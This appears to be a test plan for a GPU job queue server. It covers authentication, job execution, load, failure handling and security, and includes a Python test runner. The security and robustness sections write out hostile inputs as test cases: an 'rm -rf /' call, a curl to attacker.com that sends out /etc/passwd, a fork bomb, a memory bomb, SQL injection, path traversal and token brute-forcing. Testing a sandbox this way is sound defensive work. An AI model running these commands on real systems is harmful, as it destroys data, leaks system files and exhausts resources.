# GPU Job Queue Server - Comprehensive Testing Plan

## 🎯 Testing Objectives

1. Validate all API endpoints under normal and edge conditions
2. Identify failure points and ensure graceful error handling
3. Stress test queue management and load balancing
4. Verify security and authorization mechanisms
5. Test concurrency and race conditions
6. Ensure system reliability and recovery

---

## 1️⃣ Authentication & Authorization Tests

### 1.1 Valid Authentication
```bash
# Test: Valid token
curl -X POST http://localhost:8001/api/submit \
  -F "code=@test.py" -F "config_file=@valid_config.yaml"
```
**Expected:** Job accepted

### 1.2 Invalid Token
```yaml
# config_invalid_token.yaml
user_id: "sarang"
token: "WRONG_TOKEN"
competition_id: "test"
project_id: "test"
expected_time: 10
```
**Expected:** 401 Unauthorized

### 1.3 Token/User Mismatch
```yaml
user_id: "alice"
token: "sarang"  # sarang's token, alice's user_id
```
**Expected:** 403 Forbidden

### 1.4 Missing Token
```yaml
user_id: "sarang"
competition_id: "test"
# token field missing
```
**Expected:** 400 Bad Request

### 1.5 Unauthorized Cancellation
```bash
# Try to cancel someone else's job
curl -X POST http://localhost:8001/api/cancel/OTHER_USER_JOB_ID \
  -H "Authorization: Bearer your_token"
```
**Expected:** 403 Forbidden

---

## 2️⃣ Job Submission Tests

### 2.1 Valid Submission
```python
# valid_job.py
print("Hello GPU!")
```
**Expected:** Job completes successfully

### 2.2 Syntax Error in Code
```python
# syntax_error.py
print("Missing closing quote
```
**Expected:** Job fails with stderr showing SyntaxError

### 2.3 Runtime Error
```python
# runtime_error.py
x = 1 / 0
```
**Expected:** Job fails with stderr showing ZeroDivisionError

### 2.4 Import Missing Module
```python
# missing_module.py
import nonexistent_module
```
**Expected:** Job fails with ImportError

### 2.5 Empty Script
```python
# empty.py
# (empty file)
```
**Expected:** Job completes with empty stdout

### 2.6 Very Large Script
```bash
# Generate 10MB Python file
python3 -c "print('print(1)' * 1000000)" > large_script.py
```
**Expected:** Test file upload limits

### 2.7 Malformed YAML
```yaml
user_id: "sarang"
token: "sarang"
invalid yaml: [unclosed
```
**Expected:** 400 Bad Request - Invalid YAML

### 2.8 Missing Required Fields
```yaml
user_id: "sarang"
token: "sarang"
# missing competition_id, project_id, expected_time
```
**Expected:** 400 Bad Request

### 2.9 Binary File Upload
```bash
# Try uploading non-Python file
curl -X POST http://localhost:8001/api/submit \
  -F "code=@image.png" -F "config_file=@config.yaml"
```
**Expected:** Job fails or rejects non-text files

### 2.10 Special Characters in Filenames
```bash
# Upload with unicode/special chars
mv test.py "test_file_ñ_🔥_<script>.py"
```
**Expected:** Handles gracefully or sanitizes

### 2.11 Code Injection Attempt
```python
# injection_attempt.py
import os
os.system("rm -rf /")  # Should fail due to permissions
```
**Expected:** Permission denied (sandboxed execution)

### 2.12 Subprocess Spawning
```python
# subprocess_test.py
import subprocess
subprocess.run(['echo', 'spawned'])
```
**Expected:** Works but controlled

### 2.13 Zero Expected Time
```yaml
expected_time: 0
```
**Expected:** Accepts or validates minimum

### 2.14 Negative Expected Time
```yaml
expected_time: -10
```
**Expected:** Validation error

### 2.15 Extremely Large Expected Time
```yaml
expected_time: 999999999
```
**Expected:** Accepts but may timeout

---

## 3️⃣ Queue Management & Load Balancing Tests

### 3.1 Single Job to Each Node
```bash
# Submit 8 jobs (one per node)
for i in {1..8}; do
  curl -X POST http://localhost:8001/api/submit \
    -F "code=@test.py" -F "config_file=@config.yaml" &
done
wait
```
**Expected:** Jobs distributed across all 8 nodes

### 3.2 Queue Buildup
```bash
# Submit 50 jobs rapidly
for i in {1..50}; do
  curl -X POST http://localhost:8001/api/submit \
    -F "code=@long_job.py" -F "config_file=@config.yaml" &
done
```
**Expected:** Jobs queued, processed in order

### 3.3 Shortest Queue First
```bash
# Submit job with long expected_time to node 0
# Then submit short job - should go to different node
```
**Expected:** Load balancing works

### 3.4 Queue Position Tracking
```bash
# Submit multiple jobs, check queue position
job_id=$(submit_job | jq -r '.job_id')
curl http://localhost:8001/api/status/$job_id
```
**Expected:** Accurate queue_position returned

### 3.5 Concurrent Submissions
```bash
# 100 simultaneous requests
seq 1 100 | xargs -n1 -P100 -I{} curl -X POST http://localhost:8001/api/submit \
  -F "code=@test.py" -F "config_file=@config.yaml"
```
**Expected:** All jobs accepted, no race conditions

### 3.6 Mixed Expected Times
```bash
# Submit jobs with varying expected_time: 1s, 10s, 100s, 1000s
```
**Expected:** Balanced load distribution

---

## 4️⃣ Job Execution Tests

### 4.1 Short Job (< 1s)
```python
print("Quick")
```
**Expected:** Completes in < 2s total

### 4.2 Medium Job (10s)
```python
import time
time.sleep(10)
print("Done")
```
**Expected:** Completes in ~10s

### 4.3 Long Job (> 5 min)
```python
import time
time.sleep(400)  # 6.6 minutes
```
**Expected:** Times out at 300s, returns timeout message

### 4.4 Infinite Loop
```python
while True:
    pass
```
**Expected:** Killed after 2x expected_time

### 4.5 Memory Exhaustion Attempt
```python
# memory_bomb.py
data = []
while True:
    data.append("x" * 1000000)
```
**Expected:** Process killed by OS or system limits

### 4.6 GPU Memory Test
```python
import torch
# Try to allocate more than available GPU memory
x = torch.randn(10000000, 10000000).cuda()
```
**Expected:** CUDA out of memory error in stderr

### 4.7 Large Stdout
```python
# Generate 100MB of output
for i in range(10000000):
    print(f"Line {i}")
```
**Expected:** Stdout captured (test limits)

### 4.8 Large Stderr
```python
import sys
for i in range(1000000):
    print(f"Error {i}", file=sys.stderr)
```
**Expected:** Stderr captured

### 4.9 Mixed Output
```python
import sys
for i in range(100):
    print(f"stdout {i}")
    print(f"stderr {i}", file=sys.stderr)
```
**Expected:** Both streams captured separately

### 4.10 Exit Codes
```python
# exit_code_test.py
import sys
sys.exit(42)
```
**Expected:** exit_code = 42 in response

### 4.11 Multiple GPU Operations
```python
import subprocess
result = subprocess.run(['nvidia-smi'], capture_output=True, text=True)
print(result.stdout)
```
**Expected:** GPU info returned

### 4.12 File Creation
```python
with open('test_file.txt', 'w') as f:
    f.write('test')
print('File created')
```
**Expected:** Works in execution directory

### 4.13 Environment Variables
```python
import os
print(os.environ.get('HOME'))
print(os.environ.get('USER'))
```
**Expected:** Remote environment variables

---

## 5️⃣ Cancellation Tests

### 5.1 Cancel Pending Job
```bash
job_id=$(submit_long_job)
curl -X POST http://localhost:8001/api/cancel/$job_id \
  -H "Authorization: Bearer sarang"
```
**Expected:** Job removed from queue

### 5.2 Cancel Running Job
```bash
job_id=$(submit_long_job)
sleep 2  # Wait for it to start
curl -X POST http://localhost:8001/api/cancel/$job_id \
  -H "Authorization: Bearer sarang"
```
**Expected:** Process killed, job marked cancelled

### 5.3 Cancel Completed Job
```bash
job_id=$(submit_quick_job)
wait_for_completion
curl -X POST http://localhost:8001/api/cancel/$job_id \
  -H "Authorization: Bearer sarang"
```
**Expected:** 400 Bad Request - Already completed

### 5.4 Cancel Non-existent Job
```bash
curl -X POST http://localhost:8001/api/cancel/fake-uuid \
  -H "Authorization: Bearer sarang"
```
**Expected:** 404 Not Found

### 5.5 Cancel Without Authorization Header
```bash
curl -X POST http://localhost:8001/api/cancel/$job_id
```
**Expected:** 401 Unauthorized

---

## 6️⃣ API Endpoint Tests

### 6.1 Status of Non-existent Job
```bash
curl http://localhost:8001/api/status/non-existent-uuid
```
**Expected:** 404 Not Found

### 6.2 Results Before Completion
```bash
job_id=$(submit_long_job)
curl http://localhost:8001/api/results/$job_id
```
**Expected:** Returns with status "running", empty stdout/stderr

### 6.3 Rapid Status Polling
```bash
job_id=$(submit_job)
for i in {1..1000}; do
  curl http://localhost:8001/api/status/$job_id &
done
wait
```
**Expected:** All requests handled

### 6.4 Node Stats During Load
```bash
# Start 50 jobs
submit_many_jobs
curl http://localhost:8001/api/nodes
```
**Expected:** Accurate queue lengths

### 6.5 List Jobs Pagination
```bash
curl "http://localhost:8001/api/jobs?limit=5"
curl "http://localhost:8001/api/jobs?limit=100"
```
**Expected:** Respects limit parameter

### 6.6 Filter by User
```bash
curl "http://localhost:8001/api/jobs?user_id=sarang"
```
**Expected:** Only sarang's jobs

### 6.7 Filter by Status
```bash
curl "http://localhost:8001/api/jobs?status=completed"
curl "http://localhost:8001/api/jobs?status=running"
```
**Expected:** Filtered results

### 6.8 Malformed Requests
```bash
# Missing files
curl -X POST http://localhost:8001/api/submit

# Wrong content type
curl -X POST http://localhost:8001/api/submit \
  -H "Content-Type: application/json" \
  -d '{"code": "print(1)"}'
```
**Expected:** Proper error messages

---

## 7️⃣ Stress & Performance Tests

### 7.1 Sustained Load (100 jobs)
```bash
# Submit 100 jobs over 10 minutes
for i in {1..100}; do
  submit_job
  sleep 6
done
```
**Expected:** System stable, no memory leaks

### 7.2 Burst Load (100 jobs in 10s)
```bash
seq 1 100 | xargs -n1 -P100 -I{} submit_job
```
**Expected:** All accepted, queued properly

### 7.3 Long-Running Stress (24 hours)
```bash
# Continuously submit jobs for 24 hours
while true; do
  submit_job
  sleep 10
done
```
**Expected:** No degradation, no crashes

### 7.4 Queue Saturation (1000 jobs)
```bash
for i in {1..1000}; do
  submit_job &
done
wait
```
**Expected:** Database handles load, queue works

### 7.5 API Rate Limiting Test
```bash
# 10,000 requests in 1 second
seq 1 10000 | xargs -n1 -P10000 -I{} \
  curl http://localhost:8001/api/jobs
```
**Expected:** Rate limiting kicks in (if implemented) or handles gracefully

### 7.6 Memory Usage Monitoring
```bash
# Monitor server memory during 500 job submissions
watch -n 1 'ps aux | grep python3'
```
**Expected:** Memory stays bounded

### 7.7 Database Lock Contention
```bash
# Many concurrent writes
seq 1 50 | xargs -n1 -P50 -I{} submit_job
```
**Expected:** No database lock errors

---

## 8️⃣ Network & SSH Tests

### 8.1 Simulate Node Unavailable
```bash
# Block node 0 IP
# Submit job
```
**Expected:** Retries or fails gracefully

### 8.2 SSH Connection Timeout
```python
# config.py: SSH_TIMEOUT = 5
# Submit to unresponsive node
```
**Expected:** Times out, job marked failed

### 8.3 Network Partition During Execution
```bash
# Start long job
# Disconnect network mid-execution
```
**Expected:** Handles gracefully, retries or fails

### 8.4 SSH Authentication Failure
```python
# config.py: Wrong SSH_PASSWORD
```
**Expected:** Job fails with authentication error

---

## 9️⃣ Database & Data Integrity Tests

### 9.1 Concurrent Job Updates
```bash
# Multiple workers updating jobs simultaneously
```
**Expected:** No race conditions, data consistent

### 9.2 Database Restart During Execution
```bash
# Kill database process mid-job
# Restart database
```
**Expected:** Recovers or handles error

### 9.3 Orphaned Jobs
```bash
# Kill worker thread during job execution
# Check if job becomes orphaned
```
**Expected:** Job eventually marked failed or recovered

### 9.4 Job History Integrity
```bash
# Submit 1000 jobs
# Verify all recorded correctly
SELECT COUNT(*) FROM jobs;
```
**Expected:** All jobs in database

---

## 🔟 Edge Cases & Special Scenarios

### 10.1 Unicode in Code
```python
# unicode_test.py
print("Hello 世界 🌍")
```
**Expected:** Unicode handled correctly

### 10.2 Very Long Output Lines
```python
print("x" * 1000000)  # 1MB single line
```
**Expected:** Line captured fully

### 10.3 Null Bytes in Output
```python
import sys
sys.stdout.buffer.write(b"Hello\x00World")
```
**Expected:** Handles or rejects gracefully

### 10.4 Concurrent Same User Submissions
```bash
# Same user submits 10 jobs simultaneously
```
**Expected:** All accepted, fair queuing

### 10.5 Server Restart with Pending Jobs
```bash
# Submit 10 long jobs
# Kill server
# Restart server
```
**Expected:** Pending jobs requeued or marked failed

### 10.6 Worker Thread Crash
```bash
# Cause worker thread to crash
# Submit new job
```
**Expected:** Other workers continue, or worker restarts

### 10.7 Disk Full Scenario
```bash
# Fill disk to capacity
# Submit job
```
**Expected:** Graceful failure with error message

### 10.8 Multiple API Instances
```bash
# Start two server instances on different ports
# Submit jobs to both
```
**Expected:** Database handles concurrent access

---

## 🔒 Security Tests

### 11.1 SQL Injection in User ID
```yaml
user_id: "'; DROP TABLE jobs; --"
token: "sarang"
```
**Expected:** Treated as literal string, no injection

### 11.2 Path Traversal in File Upload
```bash
# Try to upload with malicious filename
curl -X POST http://localhost:8001/api/submit \
  -F "code=@../../../etc/passwd" -F "config_file=@config.yaml"
```
**Expected:** Sanitized, rejected, or isolated

### 11.3 Command Injection
```python
import os
os.system("curl attacker.com?data=$(cat /etc/passwd)")
```
**Expected:** Sandboxed or blocked

### 11.4 Resource Exhaustion
```python
# Fork bomb
import os
while True:
    os.fork()
```
**Expected:** Process limits prevent

### 11.5 Token Brute Force
```bash
# Try 10000 random tokens
for i in {1..10000}; do
  test_token "random_token_$RANDOM"
done
```
**Expected:** Rate limited or account locked

---

## 📊 Monitoring & Metrics Tests

### 12.1 Job Completion Rate
```bash
# Submit 100 jobs, track completion rate
```
**Metric:** % completed successfully

### 12.2 Average Queue Time
```bash
# Calculate time from submission to start
```
**Metric:** Average wait time per node

### 12.3 Average Execution Time
```bash
# Track actual vs expected time
```
**Metric:** Accuracy of expected_time estimates

### 12.4 Error Rate
```bash
# Track failed/total jobs
```
**Metric:** System reliability %

### 12.5 API Response Time
```bash
# Measure response time for each endpoint
ab -n 1000 -c 10 http://localhost:8001/api/nodes
```
**Metric:** P50, P95, P99 latency

---

## 🧪 Test Automation Scripts

### Test Runner Script
```python
#!/usr/bin/env python3
"""Automated test runner for GPU Job Queue Server"""

import requests
import time
import json
from concurrent.futures import ThreadPoolExecutor

BASE_URL = "http://localhost:8001"

def test_valid_submission():
    """Test 1.1: Valid job submission"""
    files = {
        'code': ('test.py', 'print("Hello")', 'text/plain'),
        'config_file': ('config.yaml', '''
user_id: "sarang"
token: "sarang"
competition_id: "test"
project_id: "test"
expected_time: 10
        ''', 'text/yaml')
    }
    response = requests.post(f"{BASE_URL}/api/submit", files=files)
    assert response.status_code == 200
    data = response.json()
    assert data['status'] in ['completed', 'pending', 'running']
    print("✓ Test 1.1: Valid submission passed")

def test_invalid_token():
    """Test 1.2: Invalid token"""
    files = {
        'code': ('test.py', 'print("Hello")', 'text/plain'),
        'config_file': ('config.yaml', '''
user_id: "sarang"
token: "WRONG"
competition_id: "test"
project_id: "test"
expected_time: 10
        ''', 'text/yaml')
    }
    response = requests.post(f"{BASE_URL}/api/submit", files=files)
    assert response.status_code == 401
    print("✓ Test 1.2: Invalid token passed")

def test_concurrent_submissions():
    """Test 3.5: Concurrent submissions"""
    def submit():
        files = {
            'code': ('test.py', 'print("Hello")', 'text/plain'),
            'config_file': ('config.yaml', '''
user_id: "sarang"
token: "sarang"
competition_id: "test"
project_id: "test"
expected_time: 5
            ''', 'text/yaml')
        }
        return requests.post(f"{BASE_URL}/api/submit", files=files)
    
    with ThreadPoolExecutor(max_workers=50) as executor:
        futures = [executor.submit(submit) for _ in range(50)]
        responses = [f.result() for f in futures]
    
    assert all(r.status_code == 200 for r in responses)
    print(f"✓ Test 3.5: {len(responses)} concurrent submissions passed")

def run_all_tests():
    tests = [
        test_valid_submission,
        test_invalid_token,
        test_concurrent_submissions,
    ]
    
    print("=" * 60)
    print("Running GPU Job Queue Server Tests")
    print("=" * 60)
    
    for test in tests:
        try:
            test()
        except AssertionError as e:
            print(f"✗ {test.__name__} failed: {e}")
        except Exception as e:
            print(f"✗ {test.__name__} error: {e}")
    
    print("=" * 60)
    print("Test suite complete")
    print("=" * 60)

if __name__ == "__main__":
    run_all_tests()
```

---

## 📋 Test Execution Checklist

### Phase 1: Basic Functionality (1-2 hours)
- [ ] All authentication tests (1.1-1.5)
- [ ] Basic job submissions (2.1-2.5)
- [ ] API endpoint tests (6.1-6.8)

### Phase 2: Edge Cases (2-3 hours)
- [ ] Error handling (2.6-2.15)
- [ ] Cancellation (5.1-5.5)
- [ ] Edge cases (10.1-10.8)

### Phase 3: Load Testing (4-6 hours)
- [ ] Queue management (3.1-3.6)
- [ ] Stress tests (7.1-7.7)
- [ ] Concurrent operations

### Phase 4: Reliability (8-24 hours)
- [ ] Long-running tests (7.3)
- [ ] Recovery scenarios (9.3, 10.5-10.6)
- [ ] Network failures (8.1-8.4)

### Phase 5: Security (2-3 hours)
- [ ] All security tests (11.1-11.5)
- [ ] Privilege escalation attempts
- [ ] Data leakage tests

---

## 🐛 Known Issues / Expected Failures

Document failures here during testing:

1. **Issue:** Timeout handling
   - **Test:** 4.3 Long Job
   - **Status:** TO BE TESTED
   - **Fix:** TBD

2. **Issue:** Rate limiting
   - **Test:** 7.5 API Rate Limiting
   - **Status:** NOT IMPLEMENTED
   - **Fix:** Add rate limiting middleware

---

## 📈 Success Criteria

- ✅ 95%+ tests pass
- ✅ No crashes under normal load
- ✅ Graceful degradation under stress
- ✅ All security tests pass
- ✅ Response time < 1s for status checks
- ✅ Job completion rate > 99%
- ✅ Zero data corruption
- ✅ Proper error messages for all failures

---

## 🔄 Continuous Testing

### Daily Smoke Tests
```bash
# Run core functionality tests
./run_tests.py --suite smoke
```

### Weekly Full Suite
```bash
# Run complete test suite
./run_tests.py --suite full
```

### Pre-deployment
```bash
# Run all tests before deploying changes
./run_tests.py --suite all --verbose
```

---

## 📝 Test Results Template

```markdown
## Test Run: YYYY-MM-DD HH:MM

**Environment:** Production / Staging / Local
**Version:** v1.0.0
**Tester:** Name

### Results
- Tests Run: X
- Passed: X
- Failed: X
- Skipped: X

### Failures
1. Test X.X: Description
   - Expected: ...
   - Actual: ...
   - Root Cause: ...
   - Fix: ...

### Performance Metrics
- Average Response Time: Xms
- Peak Memory Usage: XMB
- Jobs Completed: X
- Error Rate: X%

### Recommendations
- [ ] Action item 1
- [ ] Action item 2
```

